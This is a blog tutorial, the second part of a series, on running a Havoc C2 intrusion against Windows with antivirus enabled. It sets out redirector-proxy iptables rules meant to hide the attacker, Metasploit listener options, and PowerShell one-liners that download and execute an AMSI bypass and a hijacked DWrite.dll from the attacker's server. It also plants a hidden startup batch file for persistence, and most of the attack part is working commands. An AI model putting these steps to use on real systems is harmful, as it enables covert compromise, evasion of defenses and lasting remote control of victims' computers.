# https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 2)

## DISCLAIMER: Using these tools and methods against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using these tools and methods.

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:32:32/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---byline--d3ac83589e3a---------------------------------------)

[Sam Rothlisberger](https://medium.com/@sam.rothlisberger?source=post_page---byline--d3ac83589e3a---------------------------------------)

Follow

9 min read

·

Feb 3, 2024

291

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dd3ac83589e3a&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&source=---header_actions--d3ac83589e3a---------------------post_audio_button------------------)

Share

This post is a continuation of part 1 where we successfully executed a Havoc C2 reverse shell via DLL hijacking with AV enabled. Now we’re going to do acouple more things to make our exploit more complete:

- Use a redirector server to hide the true location of our Team Server (command and control server) via port forwarding
- Put the executable and DLL in a normal program file folder and start on user login to achieve persistence

### Hiding the Location of our Havoc Team Server

The first thing we need to do is hide the true location of the C2 server. Basically, we will have a proxy machine that forwards everything to our command-and-control server. This is done to change your country of origin, hide your name if you purchase a robust and long-lasting C&C server with a debit/credit card, protect infrastructure long term, and ultimately maintain deniability and non-attribution. There are ways to purchase VPS infrastructure anonymously and with little financial investment. You can also use more than one proxy or simply relay your connection through the TOR network from your initial proxy. Here’s how to run a kali linux headless instance on DigitalOcean for our proxy server if you want to learn how. It’s only about $6 a month.

[**Digital Ocean \| Kali Linux Documentation** \\
\\
**DigitalOcean is a cloud provider similar to AWS, Microsoft Azure, Google Cloud Platform, and many others. They offer…**\\
\\
www.kali.org](https://www.kali.org/docs/cloud/digitalocean/?source=post_page-----d3ac83589e3a---------------------------------------)

The Team Server and client are going to be running on the C&C server. The only thing we are running on the proxy server is port forwarding from the victim host to C&C server. In our case, we will forward everything to/from port 8443, 80, and 443 on the proxy server to/from port 50000, 50001, and 50002 on the C&C server, respectively.

> Victim host → Proxy (DigitalOcean droplet w/ public IP) server → C&C server

Because of this, we need to change some addresses in our exploit from part 1 of this post:

**Step 1)** Victim downloads iloveblogs.bin shellcode (stage 1) from proxy server over port 80 and loads it into memory. Behind the scenes our iloveblogs.bin shellcode is actually loaded from our C&C server on port 50000 and sent to the proxy. We need to generate a new iloveblogs.bin with the proxy server public IP so when stage 1 is executed, it knows to connect to the proxy host public IP:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*mw198RZs3nlfhzttcJ9UYA.png)

We also need to change our DWrite.dll so that it grabs the iloveblogs.bin file from our proxy server public IP:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*qY-VBzICyndDUoE6PTmmrQ.png)

**Step 2)** Victim executes the stage 1 payload (iloveblogs.bin) → downloads the stage 2 payload from port 8443 (demon.x64.bin) on proxy server. Behind the scenes our demon.x64.bin shellcode is actually loaded from our C&C server and sent to the proxy.

Here’s the options for the multi/listener on the C&C server:

- use multi/handler
- set payload windows/x64/custom/reverse\_https
- set exitfunc thread
- set lhost <ATTACKER LOCAL IP> # 192.168.0.64 in my case
- set lport 50001 # port forward from 8443 on proxy to 50001 on C&C
- set luri blog.html
- set HttpServerName Blogger
- set shellcode\_file demon.x64.bin
- set exitonsession false
- set HttpHostHeader [www.factbook.com](http://www.factbook.com/)
- set HandlerSSLCert [www.google.com.pem](http://www.google.com.pem/)
- run

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*eBDrFggv63_CNI0p3yqYRA.png)

**Step 3)** Stage 2 connection executed on victim and C2 established to port 443 (Havoc C2) proxy server. Behind the scene our Havoc C2 session is established with our C&C server on port 50002.

We need to change our listener (which creates demon.x64.bin) to the public IP of our proxy server over port 443, but connect to our C&C server private IP on port 50002.

![](https://miro.medium.com/v2/resize:fit:553/1*B10oLS80f7l6dpE28bq6-A.png)

Havoc C2 Listener

![](https://miro.medium.com/v2/resize:fit:551/1*pYekKYQN8C0xp6hBtfQxJA.png)

Havoc C2 Payload

This will create our demon.x64.bin file which will be served up by the Metasploit multi/listener on our C&C server and grabbed by our proxy server for the victim.

### **Port Forwarding**

Here’s how we can forward everything from our proxy server linux droplet to our C&C server bidirectionally. Replace the C&C IP address below with your own.

- Proxy Server Public Facing Interface: eth0
- C&C Server Public IP Address: 2.2.2.2

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*QsPILeaMgd2dPeAVicIO7w.png)

Proxy server addresses

Run the following commands on your proxy server droplet:

## Get Sam Rothlisberger’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

**Turn port forwarding on**

> sudo nano /etc/sysctl.conf
>
> uncomment this line : net.ipv4.ip\_forward=1
>
> sudo sysctl -p
>
> sudo sysctl — system

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*JrVOlqSmn5eNq3-tl10QrA.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*Vg3bSJQsnyn682N11Fc_3w.png)

**Accept connections from public facing interface on ports 80, 8443, and 443 for new and established connections**

> sudo iptables -A FORWARD -i eth0 -o eth0 -p tcp — syn — dport 80 -m conntrack — ctstate NEW -j ACCEPT
>
> sudo iptables -A FORWARD -i eth0 -o eth0 -p tcp — syn — dport 8443 -m conntrack — ctstate NEW -j ACCEPT
>
> sudo iptables -A FORWARD -i eth0 -o eth0 -p tcp — syn — dport 443 -m conntrack — ctstate NEW -j ACCEPT
>
> sudo iptables -A FORWARD -i eth0 -o eth0 -m conntrack — ctstate ESTABLISHED,RELATED -j ACCEPT

**For grabbing iloveblogs.bin (stage 1) shellcode from C&C server on port 50000**

> sudo iptables -t nat -A PREROUTING -i eth0 -p tcp — dport 80 -j DNAT — to-destination 2.2.2.2:50000
>
> sudo iptables -t nat -A POSTROUTING -o eth0 -p tcp — dport 50000 -d 2.2.2.2 -j MASQUERADE

**For grabbing demon.x64.bin (stage 2) shellcode from C&C server on port 50001**

> iptables -t nat -A PREROUTING -i eth0 -p tcp — dport 8443 -j DNAT — to-destination 2.2.2.2:50001
>
> sudo iptables -t nat -A POSTROUTING -o eth0 -p tcp — dport 50001 -d 2.2.2.2 -j MASQUERADE

**For establishing Havoc C2 connection to C&C server on port 50002**

> iptables -t nat -A PREROUTING -i eth0 -p tcp — dport 443 -j DNAT — to-destination 2.2.2.2:50002
>
> sudo iptables -t nat -A POSTROUTING -o eth0 -p tcp — dport 50002 -d 2.2.2.2 -j MASQUERADE

**Specify that, by default, any packet that doesn’t match any specific rule above in the FORWARD chain should be dropped (ignored) rather than being forwarded**

> sudo iptables -P FORWARD DROP

Just as a proof of concept, you can forward ports 50000, 50001, and 50002 (which is being sent from the proxy server) on your home router configuration to ports 50000, 50001, and 50002 on your kali virtual machine (192.168.0.64 in my case) which is what I did.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*IdY_Jo_9pQrbALIjoL3xmA.png)

At this point, set up all the listening posts on the C&C Server and you’re good to go with a simple proxy server forwarding and receiving all your requests.

### Exploitation Chain Example

So now that we have our infrastructure for hiding ourselves set up, let's go over an exploitation chain we could use to realistically maintain persistence on a windows machine with our DLL hijacking executable.

1. Gain Administrator access on victim via credentials or physical access
2. Execute amsi.dll memory patch bypass in PowerShell
3. Grab DLL and executable (SumatraPDF-3.5.2-install.exe) and put in “C:\\Program Files\\” folder
4. Create BAT file that will load our executable (and DLL) from “C:\\Program Files” in a hidden window
5. Put BAT file in startup directory to run every time the user logs in

We’re going to assume step 1 completed through some prior exploitation or we have physical access to the victim's computer.

**amsi.dll memory patch bypass in PowerShell**

First, we either open an administrator PowerShell session on GUI, upgrade to PowerShell with a reverse shell one-liner to our attacker machine, or use runascs with supplied administrator credentials. We then execute an AMSI memory patching script so we can run anything in the current PowerShell process memory, and it won't be flagged by AV. I just did this as a precaution. Check out my AMSI Bypass post if you don’t know how to do this.

**Grab DLL and executable (SumatraPDF-3.5.2-install.exe) and put in “C:\\Program Files\\” folder**

We need to create the SumatraPDF directory. Then we grab our normal executable from the actual vendor website and malicious DLL from our proxy and put them in the “C:\\Program Files\\SumatraPDF\\” directory.

> New-Item -ItemType Directory -Path ‘C:\\Program Files\\SumatraPDF’
>
> (New-Object System.Net.WebClient).DownloadFile(‘http://\[proxy public IP\]/DWrite.dll’, ‘C:\\Program Files\\SumatraPDF\\DWrite.dll’)
>
> (New-Object System.Net.WebClient).DownloadFile(‘ [https://www.sumatrapdfreader.org/dl/rel/3.5.2/SumatraPDF-3.5.2-64-install.exe'](https://www.sumatrapdfreader.org/dl/rel/3.5.2/SumatraPDF-3.5.2-64-install.exe'), ‘C:\\Program Files\\SumatraPDF\\SumatraPDF-3.5.2–64-install.exe’)

**Create BAT file that will load our executable (and DLL) from “C:\\Program Files\\” in a hidden window**

Then we create a batch script called SumatraPDFInstall.bat that will be run every time the user logs in, but with a hidden window.

> [@echo](http://twitter.com/echo) off
>
> set “executablePath=C:\\Program Files\\SumatraPDF\\SumatraPDF-3.5.2–64-install.exe”
>
> start /min “” “%executablePath%”

**Put BAT file in startup directory to run every time the user logs in**

Now we can grab our BAT file remotely and put it in the startup folder to be executed every time the user logs on.

> Invoke-WebRequest -Uri “http://\[proxy public IP\]/SumatraPDFInstall.bat” -OutFile “$env:TEMP\\SumatraPDFInstall.bat”
>
> Copy-Item -Path “$env:TEMP\\SumatraPDFInstall.bat” -Destination “$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\” -Force
>
> Remove-Item “$env:TEMP\\SumatraPDFInstall.bat”

Let's put all of this in a single PowerShell Script called notstrange.ps1 and I can use the public IP address of my proxy server and use port 80 which is already being port-forwarded.

> iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://\[proxy public IP\]/ammy.ps1’)”
>
> New-Item -ItemType Directory -Path ‘C:\\Program Files\\SumatraPDF’
>
> (New-Object System.Net.WebClient).DownloadFile(‘http://\[proxy public IP\]/DWrite.dll’, ‘C:\\Program Files\\SumatraPDF\\DWrite.dll’)
>
> (New-Object System.Net.WebClient).DownloadFile(‘https://www.sumatrapdfreader.org/dl/rel/3.5.2/SumatraPDF-3.5.2-64-install.exe', ‘C:\\Program Files\\SumatraPDF\\SumatraPDF-3.5.2–64-install.exe’)
>
> Invoke-WebRequest -Uri “http://\[proxy public IP\]/SumatraPDFInstall.bat” -OutFile “$env:TEMP\\SumatraPDFInstall.bat”
>
> Copy-Item -Path “$env:TEMP\\SumatraPDFInstall.bat” -Destination “$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\” -Force
>
> Remove-Item “$env:TEMP\\SumatraPDFInstall.bat”

Make sure your Havoc C2 infrastructure is running and everything is forwarded where it should be. In the victim PowerShell terminal run the following command and you will be all set:

> _iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://\[Proxy public IP\]/notstrange.ps1')”_

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*VBHTXif3Tikyz3uhEL93qw.png)

We see that the amsi.dll bypass was successful (returned true) and the directory “C:\\Program Files” is created. Our files are also grabbed through the proxy server on our C&C server.

![](https://miro.medium.com/v2/resize:fit:618/1*x1xEl5pV-osbFsJIEkh4TA.png)

And then when a user logs in…

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*D95VIiH6cOujga7OQJJm-w.png)

We see the executable running like normal on the bottom menu out of the users way.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*bGFV55NZd6m-p8rn6t_t8w.png)

Our iloveblogs.bin stage 1 payload is downloaded from our http server through the proxy server.

![](https://miro.medium.com/v2/resize:fit:581/1*v3jQ80nj4SypfWrQ8-1bOQ.png)

Then the stage 2 payload is downloaded through the proxy server using port 8443.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*sUMNosew42vWh24NZOdIfQ.png)

And we receive a Havoc C2 shell. All with defender running and not detecting anything in real time or from a system file scan.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*03bC8d5WaF4NBaAlTWZw4w.png)

There’s other ways to make my PowerShell script stealthier against EDR, but this will bypass most AV. Here you can see I’m in a medium integrity shell but vboxuser is a member of the administrators group. We could perform some UAC bypass to get to a high integrity shell fairly easily especially if we have credentials. Incorporating encryption into all my notstrange.ps1 web requests with a multi/listener would be beneficial or even hosting it all on PageKite which might look less suspicious than my proxy IP hosting everything. Try it out! I hope you enjoyed this post!

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----d3ac83589e3a---------------------------------------)

[Networking](https://medium.com/tag/networking?source=post_page-----d3ac83589e3a---------------------------------------)

[Programming](https://medium.com/tag/programming?source=post_page-----d3ac83589e3a---------------------------------------)

[C Sharp Programming](https://medium.com/tag/c-sharp-programming?source=post_page-----d3ac83589e3a---------------------------------------)

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:48:48/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--d3ac83589e3a---------------------------------------)

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:64:64/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--d3ac83589e3a---------------------------------------)

Follow

[**Written by Sam Rothlisberger**](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--d3ac83589e3a---------------------------------------)

[1K followers](https://medium.com/@sam.rothlisberger/followers?source=post_page---post_author_info--d3ac83589e3a---------------------------------------)

· [5 following](https://medium.com/@sam.rothlisberger/following?source=post_page---post_author_info--d3ac83589e3a---------------------------------------)

CompTIA Security+ Practice Questions : [https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE](https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE)

Follow

## Responses (1)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&source=---post_responses--d3ac83589e3a---------------------respond_sidebar------------------)

Cancel

Respond

[![Tylerforbes](https://miro.medium.com/v2/resize:fill:32:32/0*F8lT47kyljMZBBSt)](https://medium.com/@tylerforbes9799?source=post_page---post_responses--d3ac83589e3a----0-----------------------------------)

[Tylerforbes](https://medium.com/@tylerforbes9799?source=post_page---post_responses--d3ac83589e3a----0-----------------------------------)

[Feb 5, 2024](https://medium.com/@tylerforbes9799/another-banger-keep-it-up-854058e70195?source=post_page---post_responses--d3ac83589e3a----0-----------------------------------)

```
Another banger!!! Keep it up
```

1

Reply

## More from Sam Rothlisberger

![Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 1)](https://miro.medium.com/v2/resize:fit:679/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png)

![Manual Indirect Syscalls and Obfuscation for Shellcode Execution](https://miro.medium.com/v2/resize:fit:679/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png)

![ICMP Echo Request Data Exfiltration](https://miro.medium.com/v2/resize:fit:679/format:webp/1*g0uL5eWFv_66LpEN5IZiXA.png)

![AMSI Bypass Memory Patch Technique in 2024](https://miro.medium.com/v2/resize:fit:679/format:webp/1*YGwVi4Rkj2HBQyyC5bAbUQ.png)

[See all from Sam Rothlisberger](https://medium.com/@sam.rothlisberger?source=post_page---author_recirc--d3ac83589e3a---------------------------------------)

## Recommended from Medium

![Modifying GodPotato to Evade Antivirus](https://miro.medium.com/v2/resize:fit:679/format:webp/1*ZBfU29N4K48f1_FpL9HHCA.png)

![You wouldn’t wanna escape this security ni8mare: Exploiting n8n CVE-2026–21858 & CVE-2025–68613](https://miro.medium.com/v2/resize:fit:679/format:webp/1*00OxSrJCokwkyTGq2SfbyA.jpeg)

![13 Techniques to Stay Undetected in Corporate Networks: Master Stealthy Pentesting Like a Pro](https://miro.medium.com/v2/resize:fit:679/format:webp/0*3RDWm05NbqoVf-Bd)

![30 Days of Red Team: Day 14 — Week 2 Capstone: Simulating an Advanced Persistent Threat](https://miro.medium.com/v2/resize:fit:679/format:webp/1*eOObvQTjsbcKb4sKbfPfGA.png)

![Evading Windows Security: A List of AppLocker Bypass Techniques with LOLBAS](https://miro.medium.com/v2/resize:fit:679/format:webp/1*jGyg42-7Zk1r-TExJ_yBSg.jpeg)

![Day 1: Complex Numbers & Linear Algebra Basics](https://miro.medium.com/v2/resize:fit:679/format:webp/0*g5nYc1IL53Fd5xxN.jpg)

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--d3ac83589e3a---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----d3ac83589e3a---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----d3ac83589e3a---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----d3ac83589e3a---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d3ac83589e3a---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----d3ac83589e3a---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d3ac83589e3a---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----d3ac83589e3a---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d3ac83589e3a---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----d3ac83589e3a---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)